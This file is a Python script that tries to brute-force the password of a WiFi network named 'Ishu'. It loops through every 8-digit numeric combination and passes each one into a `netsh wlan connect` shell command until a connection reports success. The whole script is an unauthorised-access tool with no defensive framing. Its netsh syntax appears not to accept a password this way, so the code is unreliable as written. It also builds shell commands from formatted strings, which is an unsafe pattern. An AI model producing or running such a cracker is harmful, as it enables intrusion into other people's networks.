import itertools
import subprocess

def generate_passwords(characters, length):
    return itertools.product(characters, repeat=length)

def check_password(password):
    # Modify the command to match your system's way of checking WiFi connection
    command = f"netsh wlan connect name=Ishu password={password}"
    result = subprocess.run(command, shell=True, capture_output=True)
    return "successfully" in result.stdout.decode()

def main():
    characters = "0123456789"#"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"  # Add any other characters if needed
    password_length = 8  # Adjust the password length as needed

    for password_tuple in generate_passwords(characters, password_length):
        password = ''.join(password_tuple)
        print(f"Trying password: {password}")
        if check_password(password):
            print(f"Correct password found: {password}")
            break
    else:
        print("Password not found in the given character set and length.")

if __name__ == "__main__":
    main()
